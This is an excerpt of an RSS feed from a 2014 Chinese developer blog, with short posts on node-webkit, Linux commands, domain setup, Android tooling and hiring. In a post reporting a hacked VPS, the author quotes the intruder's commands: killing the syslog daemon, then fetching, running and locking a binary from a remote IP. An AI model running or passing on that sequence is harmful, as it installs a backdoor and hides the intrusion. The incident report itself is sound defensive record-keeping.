&lt;p&gt;7. 注意其中的scope. &amp;#160;它跟正常的浏览器的 &amp;#160;&amp;lt;script src=''/&amp;gt; 还是不一样的。 require（‘’）调用的是node的模块， 它会先进行一系列的 编译等操作。 &amp;#160;而 &amp;lt;script src='some_file.js'/&amp;gt; 则是最最普通的 操作。 &amp;#160;跟日常WEB浏览的行为是一样的。 &amp;#160;我今早就是被它搞了1个半小时，没有啥进展。&amp;#160;&lt;/p&gt;
&lt;p&gt;8. &amp;#160;下午又在scope上耗费一宝贵小时。。。 我会在下个帖子中详细写。&lt;/p&gt;


</description>
      <pubDate>Sat, 26 Jul 2014 03:59:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/node-webkit-first-glance-at-node-webkit</link>
    </item>
    <item>
      <title>node-webkit(npm)中安装第三方包（如jquery, coffeescript) ( install jquery, coffeescript under node/node-webkit)</title>
      <description>&lt;p&gt;$ rm ~/tmp -rf&lt;/p&gt;
&lt;p&gt;$ cd &amp;lt;your_project&amp;gt;&lt;/p&gt;
&lt;p&gt;$ npm install jquery&lt;/p&gt;
&lt;p&gt;$ npm install coffee-script&lt;/p&gt;
&lt;p&gt;如何调用？ &amp;#160;下面是一个例子：&lt;/p&gt;

&lt;pre&gt;&amp;lt;!DOCTYPE html&amp;gt;&lt;br /&gt;&amp;lt;html&amp;gt;&lt;br /&gt;  &amp;lt;head&amp;gt;&lt;br /&gt;    &amp;lt;title&amp;gt;Hello World!&amp;lt;/title&amp;gt;&lt;br /&gt;    &amp;lt;script&amp;gt;&lt;br /&gt;      require('coffee-script/register');&lt;br /&gt;      $ = require('jquery');&lt;br /&gt;    &amp;lt;/script&amp;gt;&lt;br /&gt;  &amp;lt;/head&amp;gt;&lt;br /&gt;  &amp;lt;body&amp;gt;&lt;br /&gt;    &amp;lt;h1&amp;gt;Hello World!&amp;lt;/h1&amp;gt;&lt;br /&gt;    We are using node.js &amp;lt;script&amp;gt;document.write(process.version)&amp;lt;/script&amp;gt;.&lt;br /&gt;  &amp;lt;/body&amp;gt;&lt;br /&gt;  &amp;lt;script&amp;gt;&lt;br /&gt;    alert($('body h1').html());&lt;br /&gt;  &amp;lt;/script&amp;gt;&lt;br /&gt;&amp;lt;/html&amp;gt;&lt;br /&gt;
&lt;/pre&gt;</description>
      <pubDate>Fri, 25 Jul 2014 23:21:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/node-webkit-npm-jquery-coffeescript-install-jquery-coffeescript-under-node-node-webkit</link>
    </item>
    <item>
      <title>发布node-webkit的几种方法</title>
      <description>&lt;a href="https://github.com/rogerwang/node-webkit/wiki/How-to-package-and-distribute-your-apps"&gt;https://github.com/rogerwang/node-webkit/wiki/How-to-package-and-distribute-your-apps&lt;/a&gt;</description>
      <pubDate>Fri, 25 Jul 2014 23:20:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/node-webkit</link>
    </item>
    <item>
      <title>使用node-webkit来创建桌面应用( creating desktop app using node-webkit)</title>
      <description>&lt;p&gt;the tutorial is :&amp;#160;&lt;/p&gt;
&lt;p&gt;
Create index.html:
&lt;/p&gt;
&lt;pre&gt;&amp;lt;html&amp;gt;
&amp;lt;body&amp;gt;
&amp;lt;h1&amp;gt;Hello World!&amp;lt;/h1&amp;gt;
&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;
&lt;/pre&gt;
&lt;p&gt;Create package.json:&lt;/p&gt;
&lt;pre&gt;{
  "name": "nw-demo",
  "main": "index.html"
}
&lt;/pre&gt;
&lt;p&gt;
Compress index.html and package.json into a zip archive, and rename it to app.nw:
&lt;/p&gt;
&lt;pre&gt;$ zip app.nw index.html package.json

app.nw
|-- package.json
`-- index.html
&lt;/pre&gt;
&lt;p&gt;
Download the prebuilt binary for your platform and use it to open the app.nw file:&lt;/p&gt;

$ ./nw app.nw</description>
      <pubDate>Fri, 25 Jul 2014 11:17:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/node-webkit-creating-desktop-app-using-node-webkit</link>
    </item>
    <item>
      <title>Linux 清理缓存的办法 ( free memories in linux)</title>
      <description>&lt;p&gt;1. 查看当前的内存状态： $free -m &amp;#160; ( &amp;#160; check current memory usage )&amp;#160;&lt;/p&gt;
&lt;p&gt;或者 使用 $top , 然后 c, 1 &amp;#160;( or $top, press c, 1 )&amp;#160;&lt;/p&gt;
&lt;p&gt;2. $ sync&amp;#160;&lt;/p&gt;
&lt;p&gt;3. $ echo 3 &amp;gt; /proc/sys/vm/drop_caches&amp;#160;&lt;/p&gt;

&lt;p&gt; Before free: &lt;/p&gt;
&lt;pre&gt;root@li539-250:/opt/app/siwei/wawa_site/config# free -m
             total       used       free     shared    buffers     cached
Mem:          4000       3661        338          0        964        909
-/+ buffers/cache:       1787       2212
Swap:          499          0        499

&lt;/pre&gt;

&lt;p&gt; After free: （可以看出， 释放了2G的内存） &amp;#160;&lt;/p&gt;
&lt;pre&gt;root@li539-250:/opt/app/siwei/wawa_site/config# free -m
             total       used       free     shared    buffers     cached
Mem:          4000       1697       2303          0          2         38
-/+ buffers/cache:       1655       2344
Swap:          499          0        499
&lt;/pre&gt;</description>
      <pubDate>Thu, 24 Jul 2014 06:31:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/free-memories-in-linux</link>
    </item>
    <item>
      <title>查看crontab 最后一次被修改的时间</title>
      <description>&lt;p&gt;查看crontab 最后一次被修改的时间：&lt;/p&gt;
&lt;p&gt;01:14 [root@a01.download.3g.suzhou.yoqoo]$ ls -l /var/spool/cron/root &lt;br /&gt;-rw-------  1 root root 297 Apr 17 10:29 /var/spool/cron/root&lt;br /&gt;&lt;/p&gt;</description>
      <pubDate>Wed, 23 Jul 2014 17:15:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/crontab</link>
    </item>
    <item>
      <title>copy all files from gem folder to rails folder</title>
      <description>&lt;p&gt;$ cd &amp;lt;gem_folder&amp;gt;&lt;/p&gt;
&lt;p&gt;$ cp -r app config lib &amp;lt;rails_folder&amp;gt;&lt;/p&gt;
&lt;p&gt;不过这个方法不够好，因为 script 目录下的文件容易被覆盖 ( local.yml, routes.rb 等） ，最好的办法还是让这个 gem 单独写个rake 任务，（例如： rake your_gem:override ） &amp;#160;( the best solution is use the gem's method : override if there is )&amp;#160;&lt;/p&gt;
&lt;p&gt;一般来说， copy app 目录就可以了。 例如： config/routes, config/local 目录一般不用COPY，因为看controller, &amp;#160; view是最重要的。&lt;/p&gt;</description>
      <pubDate>Sun, 20 Jul 2014 02:22:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/copy-all-files-from-gem-folder-to-rails-folder</link>
    </item>
    <item>
      <title>如何查看自己的CPU是 64 还是32位的？( how to determin a cpu is 32 or 64 bit? )</title>
      <description>&lt;p&gt;参考： &lt;a href="http://stackoverflow.com/questions/246007/how-to-determine-whether-a-given-linux-is-32-bit-or-64-bit" target="_blank"&gt;http://stackoverflow.com/questions/246007/how-to-determine-whether-a-given-linux-is-32-bit-or-64-bit&lt;/a&gt; &lt;/p&gt;
&lt;p&gt;1.  $  uname -m &lt;/p&gt; 
&lt;pre&gt;x86_64 ==&amp;gt; 64-bit kernel
i686   ==&amp;gt; 32-bit kernel
&lt;/pre&gt;

&lt;p&gt;2. $ lscpu &lt;/p&gt;

&lt;p&gt;3. $ grep flag /proc/cpuinfo  ， 具有：  lm ==&amp;gt; 64-bit processor  就是 64位的啦 &lt;/p&gt;
</description>
      <pubDate>Wed, 16 Jul 2014 06:09:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/cpu-64-32-how-to-determin-a-cpu-is-32-or-64-bit</link>
    </item>
    <item>
      <title>Linux 的几个好用的命令 ( sweet commands in linux) </title>
      <description>&lt;p&gt; 这是一个循环，把 /tmp/test.lst 文件中的 每一行都读出来，然后循环运行rsync 命令 . (注意其中的 exclude ) ( a loop that reads all the lines of contents in a file named /tmp/test.lst and then run them one by one)  &lt;/p&gt;
&lt;pre&gt;for i in `cat /tmp/test.lst`;do
rsync -avzPl --exclude="2013*" --exclude="201404*" --exclude='*.log*' --exclude='*.git' --exclude='*.sql' ./$i 10.103.13.37::cmscode
done
&lt;/pre&gt;

&lt;p&gt; 在当前目录下，找到所有的文件中包含的 10.103.13.74 ，并且把它替换成：  10.103.13.37  ( find all the '10.103.13.74' and then replace them with '10.103.13.37') 这个功能跟 VIM plugin:  Greplace 是一样的。&lt;/p&gt;
&lt;pre&gt;sed -i "s/10.103.13.74/10.103.13.37/g" `grep "10.103.13.74" -rl ./`
&lt;/pre&gt;</description>
      <pubDate>Tue, 15 Jul 2014 00:30:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/sweet-commands-examples-in-linux</link>
    </item>
    <item>
      <title>拿什么拯救你，我的遗留项目？ </title>
      <description>&lt;p&gt;接手遗留项目的特点：&amp;#160;&lt;/p&gt;
&lt;p&gt;1. 代码都很烂。&lt;/p&gt;
&lt;p&gt;2. BUG 多多。 容易宕机&lt;/p&gt;
&lt;p&gt;3. 部署麻烦。有 ftp 部署的。 有直接 svn up更新代码的。&lt;/p&gt;
&lt;p&gt;4. 架构有问题。 &amp;#160;&lt;/p&gt;
&lt;p&gt;5. 接盘的人必须技能大约前任作者。否则看不懂代码。&lt;/p&gt;
&lt;p&gt;6. 处于崩溃（服务器死机， 或者进展极其缓慢） 边缘。&amp;#160;&lt;/p&gt;
&lt;p&gt;解决办法：&lt;/p&gt;
&lt;p&gt;1. 该推倒的就推倒重做。(前提： 项目组中存在 资深元老级用户，知道这个系统的所有功能点，知道哪些可以砍掉，哪些需要保留）&lt;/p&gt;
&lt;p&gt;2. 80%情况下无法推倒，那么就先精简代码。 做重构。添加测试。 总之原则： &amp;#160;改善现有的项目体系（代码层面， 业务逻辑层面， 部署运维层面， 架构层面）&lt;/p&gt;
&lt;p&gt;3.&amp;#160;&lt;/p&gt;</description>
      <pubDate>Sat, 12 Jul 2014 23:34:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/how-to-work-on-an-existing-project</link>
    </item>
    <item>
      <title>死亡项目的特点</title>
      <description>&lt;p&gt;1. 沟通不够（特别是异地外包项目）&lt;/p&gt;
&lt;p&gt;2. 没有妹子，都是爆脾气的汉子（沟通的重要性）&lt;/p&gt;
&lt;p&gt;3. 需求经常变动。一句话需求。（我们要做成跟XX一样）&lt;/p&gt;
&lt;p&gt;4. 开发人员没有节奏。（ 每15分钟被打算一次， 另外，需求不断变更）&lt;/p&gt;
&lt;p&gt;5. 外包：不要找太便宜的人做。 &amp;#160;&lt;/p&gt;
&lt;p&gt;6. 人员变动的厉害 （软件项目，最重要的是人啊亲！)&amp;#160;&lt;/p&gt;
&lt;p&gt;7. 周期太长（大于6个月的项目失败几率都特别大）&lt;/p&gt;</description>
      <pubDate>Sat, 12 Jul 2014 11:59:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/why-project-failed</link>
    </item>
    <item>
      <title>购买godaddy域名的流程：   ( setup your domain step by step) </title>
      <description>&lt;p&gt; 购买域名的流程： &lt;/p&gt;
&lt;p&gt;
1. 在godaddy注册 （千万不要在 www.net.cn 上。 国内的域名需要备案。你懂的。）     &lt;br /&gt;
2. 选个自己的域名， 例如： sujingyi.com  （现在还没有人注册～ ） &lt;br /&gt;&lt;img src="/system/images/BAhbBlsHOgZmSSJEMjAxNC8wNy8wNy8xN18xMF8xNV8zODZfU2NyZWVuc2hvdF9mcm9tXzIwMTRfMDdfMDdfMTdfMDFfMjQucG5nBjoGRVQ/Screenshot%20from%202014-07-07%2017png:24.:ext" title="Screenshot From 2014 07 07 17:01:24" alt="Screenshot From 2014 07 07 17:01:24" rel="225x255" width="1280.1818182468414" height="800.1818182468414" /&gt;&lt;br /&gt;&lt;br /&gt;&amp;#160;&lt;br /&gt;&lt;br /&gt;3. 付费 &lt;br /&gt;
4. 登录后台， &lt;br /&gt;
  4.1 点击 Visit My account, 在对应的 Domains 那里，点击 Launch. &lt;br /&gt;&lt;img src="/system/images/BAhbBlsHOgZmSSJEMjAxNC8wNy8wNy8xN18wOV81MV8yMjFfU2NyZWVuc2hvdF9mcm9tXzIwMTRfMDdfMDdfMTZfNDRfMjAucG5nBjoGRVQ/Screenshot%20from%202014-07-07%2016png:20.:ext" title="Screenshot From 2014 07 07 16:44:20" alt="Screenshot From 2014 07 07 16:44:20" rel="225x255" width="1280.1818182468414" height="800.1818182468414" /&gt;&lt;br /&gt;&lt;br /&gt;&amp;#160; &amp;#160;&lt;br /&gt;4.2 会显示出一个列表，你刚才购买的域名就在里面。 点击之。 &lt;br /&gt;
  4.3 点击  DNS Zone file, 会看到你的域名的指向配置。 配置A 地址中的 @ 和 www 指向 106.186.19.250 就好。   &lt;br /&gt;
       (其他的， 比如 Nameserver 啥的，都不用改） &lt;br /&gt;&lt;br /&gt;&lt;img src="/system/images/BAhbBlsHOgZmSSJEMjAxNC8wNy8wNy8xN18xMF8yNV8yMTZfU2NyZWVuc2hvdF9mcm9tXzIwMTRfMDdfMDdfMTZfNDVfMTgucG5nBjoGRVQ/Screenshot%20from%202014-07-07%2016png:18.:ext" title="Screenshot From 2014 07 07 16:45:18" alt="Screenshot From 2014 07 07 16:45:18" rel="225x255" width="1280.1818182468414" height="800.1818182468414" /&gt;&lt;br /&gt;&lt;br /&gt;
  4.4 保存。 &lt;br /&gt;
（详细的步骤如果不懂，请百度） &lt;br /&gt;
&lt;/p&gt;
&lt;p&gt;验证的方式：
&lt;/p&gt;
&lt;pre&gt;$ ping sujingyi.com   &lt;/pre&gt;
&lt;p&gt;如果给出的IP地址跟你刚才配置的地址一致，说明你的IP地址配对了。
&lt;/p&gt;
&lt;pre&gt;64 bytes from li539-250.members.linode.com (106.186.19.250): icmp_req=1 ttl=47 time=83.4 ms
&lt;/pre&gt;</description>
      <pubDate>Mon, 07 Jul 2014 08:47:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/setup-your-domain-step-by-step</link>
    </item>
    <item>
      <title>使用 greplace/gsearch ( using greplace vim plugin) </title>
      <description>&lt;p&gt;这几天发现我的vim 插件 greplace不好使了。 每次使用 
&lt;/p&gt;
&lt;pre&gt; :Gsearch -F 'some_string' -R --include=*rb 
&lt;/pre&gt;
都会报错。

&lt;p&gt;解决办法：  （在后面加个 . ) &lt;/p&gt;
&lt;pre&gt; :Gsearch -F 'some_string' -R --include=*rb .  
&lt;/pre&gt;</description>
      <pubDate>Mon, 07 Jul 2014 05:31:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/using-greplace-vim-plugin</link>
    </item>
    <item>
      <title>在线打开 word  (open word file online ) </title>
      <description>&lt;p&gt;
  今天收到几个简历， 在LINUX 和 MAC上都无法打开（51job 生成的）  ，  结果，只好用一个在线打开DOC的网址：  
&lt;/p&gt;
&lt;a href="https://onedrive.live.com/"&gt;https://onedrive.live.com/&lt;/a&gt;
&lt;p&gt;太简单了啊。o(∩∩)o...哈哈&amp;#160;&lt;/p&gt;</description>
      <pubDate>Mon, 07 Jul 2014 05:28:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/open-word-file-online</link>
    </item>
    <item>
      <title>拉勾网CEO 马德龙分享  2014-07-06</title>
      <description>&lt;p&gt;2014年7月5日（周六）&lt;br /&gt;猎云网组织活动，邀请分享嘉宾 拉钩网CEO 马德龙分享&lt;br /&gt;关于做事&lt;br /&gt;找人：1、要找靠谱的人&lt;br /&gt;      2、人要稳重，不自私&lt;br /&gt;      3、有团队奉献精神，不怀疑&lt;br /&gt;做成一件事最终要，少占小便宜，否则一旦失败，占多少股份都没用。&lt;br /&gt;成功经验&lt;br /&gt;1、事情的成功首先要把握用户需求；&lt;br /&gt;①工资透明&lt;br /&gt;②快速反馈投递结果&lt;br /&gt;2、有3W支持&lt;br /&gt;3、有微信给的特殊接口&lt;br /&gt;4、认清了用户比企业（厂商）重要，对厂商特别强硬&lt;br /&gt;5、做事容易，管人很难&lt;br /&gt;3W的经验&lt;br /&gt;2 99%的创业者都没有平台（产品）&lt;br /&gt;3 如果当初散伙的3个人不是考虑太多的私事，把事做成就好了&lt;br /&gt;4 创业8个月，估值1个亿/1000万？？（到底是一个亿还是一千万？）&lt;br /&gt;5 58同城  低端、51job、zhaopin.com中端、Linkedin 高端市场&lt;br /&gt;备注：前期宣传靠用户口口相传，把第一批用户培养成粉丝。&lt;/p&gt;
&lt;p&gt;1、 当上老板后要考虑的事情太多，焦虑，所以脾气开始急躁&lt;br /&gt;2、 在某个关键功能点上狠下功夫，例如：面议你妹&lt;br /&gt;3、 不给面议太多选项，对于不认真填工资的人，让客户给他电话；&lt;br /&gt;再如：投简历秒回复，在论坛、微博上发起活动，晒最快收到面试结束时间、在技术上/非技术上都引导/强迫HR来支持这件事情等。&lt;/p&gt;</description>
      <pubDate>Sun, 06 Jul 2014 09:28:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/lagou-jingyan</link>
    </item>
    <item>
      <title>使用wget 获取整站的内容（ using wget to fetch a full site) </title>
      <description>&lt;p&gt;安卓文档打开太麻烦，要翻墙。所以。。。。&lt;/p&gt;
&lt;pre&gt;$ wget --limit-rate=200k --no-clobber --convert-links --random-wait -r -p -E -e robots=off -U mozilla  http://developer.android.com
&lt;/pre&gt;
&lt;p&gt; 现在 整个 develop.android.com 都被下载到本地了，是不是爽歪歪？ &lt;/p&gt; 

&lt;p&gt; 参考：  &lt;a href="http://www.kossboss.com/linux---wget-full-website"&gt;http://www.kossboss.com/linux---wget-full-website&lt;/a&gt; &lt;/p&gt;</description>
      <pubDate>Sun, 06 Jul 2014 02:07:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/fetch-a-full-site-using-wget</link>
    </item>
    <item>
      <title>搭建android 开发环境 (jruby )   ( setup android development in linux) </title>
      <description>&lt;p&gt;参考： &lt;a href="https://github.com/ruboto/ruboto"&gt;https://github.com/ruboto/ruboto&lt;/a&gt;
&lt;/p&gt;
&lt;pre&gt;$ install rbenv/ruby
$ gem install ruboto
$ sudo aptitude install openjdk-7-jdk ( in ubuntu) 
$ install android sdk
$ wget http://mirrors.hust.edu.cn/apache//ant/binaries/apache-ant-1.9.4-bin.zip , then unzip it. 
$ vim ~/.bashrc, 把下面的变量都加进去： 

    ADT_PATH=/sg552/adt-bundle-linux-x86-20130522/
    JAVA_HOME=/usr/lib/jvm/java-7-openjdk-amd64/
    ANT_HOME=/sg552/workspace/ant-1.9.4
    ANDROID_HOME=$ADT_PATH/sdk
    PATH=$PATH:$ANDROID_HOME/platform-tools
    PATH=$PATH:$JAVA_HOME/bin:$ANT_HOME/bin:$ANDROID_HOME/tools:$ANDROID_HOME/build-tools:$ANDROID_HOME/platform-tools
    PATH=$PATH:$ANDROID_HOME/build-tools/android-4.2.2/

$ gem install jruby-jars
$ ruboto setup

这个时候一般会报错： 

sg552@youku:/sg552/adt-bundle-linux-x86-20130522/sdk/build-tools/android-4.2.2$ ruboto setup
WARN: Unresolved specs during Gem::Specification.reset:
      rake (~&amp;gt; 10.0)
WARN: Clearing out unresolved specs.
Please report a bug if this causes problems.
Java runtime             : Found
Java Compiler            : Found
Apache ANT               : Found
Android Package Installer: Found
Android Emulator         : Found
Android SDK Command adb  : Found
Android SDK Command dx   : Found
Platform SDK android-15  : Not found

    !!! Ruboto setup is NOT OK !!!

Android platform SDK for android-15 not found.
Would you like to download and install it? (Y/n): 

意思是问没有找到android-15这个SDK（ 它对应着 android 4.0的版本，而我们下载的是 4.4的版本， 外号叫
  android 17 sdk , 所以暂时忽略这个错误）
&lt;/pre&gt;

&lt;p&gt;然后这个程序会为我们自动安装 android-15 ， &lt;/p&gt;
&lt;pre&gt;Installing Archives:
  Preparing to install archives
  Downloading SDK Platform Android 4.0.3, API 15, revision 3
  Installing SDK Platform Android 4.0.3, API 15, revision 3
    Installed SDK Platform Android 4.0.3, API 15, revision 396%)
  Done. 1 package installed.
Platform SDK android-15  : Found
Java runtime             : Found
Java Compiler            : Found
Apache ANT               : Found
Android Package Installer: Found
Android Emulator         : Found
Android SDK Command adb  : Found
Android SDK Command dx   : Found
Platform SDK android-15  : Found

    *** Ruboto setup is OK! ***

&lt;/pre&gt;

</description>
      <pubDate>Sun, 06 Jul 2014 01:23:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/setup-android-development-in-linux</link>
    </item>
    <item>
      <title>不要过度优化 ( don't over-engineering, such as over-optimization ) </title>
      <description>&lt;p&gt;现在的CPU， 硬盘发展的太快了，不要过度的优化。 &amp;#160;&lt;/p&gt;
&lt;p&gt;要关注产品的特点， &amp;#160;速度达到要求即可。&amp;#160;&lt;/p&gt;
&lt;p&gt;TODO： 加上例子： &amp;#160;lotus 在DOS时代 为了优化速度，优化占用内存的空间， 耗费的大量的时间，结果 在win3.2 出现的时候被windows一举歼灭。 &amp;#160;而且那时候硬件的发展还遵循着摩尔定律。 半年的优化时间， 早都让 CPU 翻了番了。&lt;/p&gt;</description>
      <pubDate>Thu, 03 Jul 2014 05:49:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/do-not-over-engineering-such-as-optimization</link>
    </item>
    <item>
      <title>服务器被黑了(my VPS was hacked)</title>
      <description>&lt;p&gt;自己的两台服务器昨天和今天早上都被福建的一个IP给黑了。 在1号服务器上他没做什么， 在2号服务器上他做的内容是：&lt;/p&gt;
&lt;pre&gt;killall -9 rsyslogd
wget http://96.44.185.98:8080/ssh33
chmod +x ssh33
./ssh33
chattr +i ssh33
&lt;/pre&gt;
&lt;p&gt; 我没有搜到 ssh33 这货是啥，唯一看到的是 里面最后一行有20W个字符。包括了各种CPP啥东东，见附件。 我估计是个后门脚本。&lt;/p&gt;
&lt;p&gt;还在home 目录下多了一个 fack.cfg ，不知道是啥，内容是：&lt;/p&gt;
&lt;pre&gt;  1 0
  2 106.186.19.250:106.186.19.250
  3 10000:60000
  4 -59
&lt;/pre&gt;
&lt;p&gt;/var/logs/kern.log 下面多了一行： &amp;#160;&lt;/p&gt;
&lt;pre&gt; 20 Jul  1 00:56:29 li539-250 kernel: imklog 5.8.6, log source = /proc/kmsg started.
&lt;/pre&gt;
</description>
      <pubDate>Mon, 30 Jun 2014 22:19:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/my-vps-was-hacked</link>
    </item>
    <item>
      <title>候选人的选择： 应届生 V.S. 社招生 (refresh-graduate v.s. candidate with x years exp)</title>
      <description>&lt;p&gt;我们组一直在招人。 理想的情况是：有着工作经验，勤奋好学，吃苦耐劳的精英。 但是随着面试的跟进，看法变了：&lt;br /&gt;一般看好应届生。 社招生平庸的太多。&lt;/p&gt;
&lt;p&gt;1. 比较性格 （面对各种带有压力的提问，都可以很好的做回答。）&lt;br /&gt;我在非技术层面会问两个问题：&lt;br /&gt;&amp;#160; （1） 优酷的工作压力很大，很辛苦，很多人在加班，你对这个问题怎么看？ &amp;#160;几乎所有应届生都说： “可以加班，年轻的时候就应该吃苦”。 &amp;#160;然后我会进一步的问： “如果我问得过分些，能告诉我每天你可以额外加班几个小时吗？ " 得到的回答都是2个小时以上。最猛的一个兄弟说可以睡在公司，可以干到12点。 我进一步再问：“周六和周日两天可以来吗？” &amp;#160;所有的回答都是“可以的”。 &amp;#160;&amp;#160;&lt;/p&gt;
&lt;p&gt;&amp;#160;（2） 第二个问题： “我们的项目一般都是分配给不同的人来做的。如果你和另外一个同学搭档，而他的脾气比较坏，比较喜欢踢皮球。在某天，有一个新特性要实现，从中立的技术人员的角度看，30%的几率应该放在你这里， 70%的几率可以放到他那里。 但是他就是很强硬的要求放在你这里。 你该怎么办？” &amp;#160; （ 这个问题考虑的是面试者的沟通能力，沟通技巧，面对棘手问题的处理能力，所以没有固定的答案）&amp;#160;&lt;/span&gt;比较好的回答是： “我会先跟他耐心的沟通。告诉他这个东西坐在他那里是合适的”&lt;br /&gt;我这时会进一步问：“如果对方很强硬，就是一定要做在你这里，怎么办？”&lt;br /&gt;这个问题所有的人都会犹豫一段时间，（确实很让人郁闷的情况），但是几乎所有的优秀应届生都会说“就先做在我这里吧。 多写一些代码就能解决问题了。不踢皮球”。&amp;#160;&lt;br /&gt;&lt;br /&gt;很好。 于是我会进一步问道：“ 好的。如果还有第二次的情况， 对方还是很强硬，把本来他该做的事情（60%的几率该他做，30～40%的几率该你做）放在你这里呢？” &amp;#160;这个时候比较好的回答就是“再次跟对方沟通， 比较客气和客观的表达出自己的看法： 团队协作的重要性。 上次我做了，这次该你来了。等等”。 &amp;#160; （这个问题考察的是对方对沟通看中的重要性。 看他是否是比较软弱，没有主见）&amp;#160;&lt;br /&gt;&lt;br /&gt;然后我会抛出杀手锏：“如果你之前做的这个东西，最后出了问题，老大们追究责任的时候，发现这个东东是你做的。所以现在的情况是，你做了别人的事情，不但没有额外得到嘉奖，却‘多做多错’了。 &amp;#160;怎么办？”&amp;#160;&lt;br /&gt;&lt;br /&gt;于是我得到的所有回答都是： “没关系。因为这个东西是我做的。我做了就要承担责任” &amp;#160; &amp;#160; 。 &amp;#160;&amp;#160;&lt;br /&gt;&lt;br /&gt;这样的员工，赶紧收了吧。 &amp;#160;&amp;#160;&lt;/p&gt;
&lt;p&gt;2. 几乎没有对象。 （呃，我们IT人是不是很苦B？ ） &amp;#160; 所以不会出现 提前下班买菜接孩子的现象。&amp;#160;&lt;/p&gt;
&lt;p&gt;3. 更容易得到学习能力强的应届生。 &amp;#160;&lt;/p&gt;
&lt;p&gt;从接收到的简历来看，都是学习能力强的应届生。 学习能力如何看出来？就看一个人面对自己不感兴趣的东西时，表现出来的能力。说通俗些，找学校成绩好的，名校的，学历高的就基本没错。当初大家都认为思想政治难学，申论难学，但是学习能力强的人就能考高分。当然了，这个跟个体的差异也有关。也有学历低能力高的。但是几率太小。&lt;/p&gt;
&lt;p&gt;4. 对比几个平庸社招生的简历，优秀应届生完全不虚。性格，抗压能力，吃苦耐劳各方面完胜。社招生唯一的优势：略懂某技术，但是在应届生面前努力2，3个月就补回来了。 而且3个月之后，应届生会做的更好！～&lt;/p&gt;
&lt;p&gt;5. 稳定性更好 （一般说来，9K的工资就已经非常满足了。而1,2年经验的社招生我见过敢要年薪20W的。。。）人在软件技术团队中是非常重要的因素啊亲！在目前的互联网时代，流水的营盘流水的兵，一个人可以待上两年，对公司就是件不错的事。&lt;/p&gt;
&lt;p&gt;6. 可塑性更好（可以做RUBY, PYTHON , NODEJS。。。甚至是移动APP开发。。。应届生表现出来的对技术的热情远高于社招生）&lt;/p&gt;
</description>
      <pubDate>Mon, 30 Jun 2014 21:13:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/freshman-vs-experienced-candidate</link>
    </item>
    <item>
      <title>书稿 技术的重要性</title>
      <description>&lt;h3&gt;经验： &amp;#160;绝对不要找太便宜的软件承接方。&lt;/h3&gt;
&lt;p&gt;互联网创业，绝对不要找太便宜的 人，和团队。 跟其他行业一样。软件行业也是一分钱一分货。出的钱高，就能找到靠谱的人或者团队。 出的钱低，那么获得的软件质量也不敢恭维。&lt;/p&gt;
&lt;p&gt;案例： 某位朋友，需要做的项目量级上千万。但是在软件投入方面仅仅是10万。 结果对方无法保证项目的按时交付。&lt;/p&gt;
&lt;p&gt;深层分析：在北京，一个3年经验的程序员月薪假设1W， 那么在一个正规的公司，每个月要为他消耗2W。 如果某个项目， 需要5人月（就是需要一个人干5个月。 人月： 是衡量软件工期的单位。）那么它的成本就是10W。 &amp;#160;如果你的项目以低于成本价的价格 外包出去。那么80%是失败的。 因为对方是一个连成本都不会估算的软件承接方。不要指望他能很好的控制工期进度。&lt;/p&gt;
&lt;h3&gt;经验：明确互联网在自己项目中的位置。&lt;/h3&gt;
&lt;p&gt;很多朋友，在自己的项目中，不太明确互联网技术的地位。比如： 某个项目，又有线下的实体商店，又有线上的 网店， 有移动应用APP。那么，该如何确认自己的项目是否是一个“互联网项目”呢？ 很简单。 你就假设自己没有移动APP， 没有线上的网店，你看看这个项目能不能正常运转。 如果不能的话，你就要小心了。 &amp;#160;如果你为自己的项目整体估值1000W。 那么你务必不要把自己的互联网技术上的预算弄得太低。&lt;/p&gt;
&lt;h3&gt;经验： 一个靠谱的技术开发团队的运营成本。&lt;/h3&gt;
&lt;p&gt;什么样的团队是靠谱的？ 1 。 诚信，不忽悠客户。 2. 有扎实的技术，和成功的案例。&amp;#160;&lt;/p&gt;
&lt;p&gt;一般来说，这样团队的组成是：&amp;#160; 开发人员（2，3名） + 测试人员（1名） + 项目经理（1名） + 运维人员（1名）&amp;#160;
&lt;/p&gt;
&lt;p&gt;而一个互联网项目，给这个团队做的话，最少要做6个月，要做成熟的按照1年时间来算， 5人 X 12 个月 X 2W。 = 120W &amp;#160;&lt;/p&gt;
&lt;p&gt;如果考虑到这个项目除了PC端，还要上移动端（只考虑IOS，ANDROID，不考虑winphone等）, 那么开发人员还要增加2～4名，&lt;/p&gt;
&lt;p&gt;这个时候的成本就是： &amp;#160;170 ~ 220 W. &amp;#160;&amp;#160;&lt;/p&gt;
&lt;p&gt;结论： 如果没有足够的干粮（比如说200W） 做好未来一年挨饿的准备，那么团队是养不起的。&lt;/p&gt;
&lt;h3&gt;经验：外包项目与自己培养团队的比较&lt;/h3&gt;
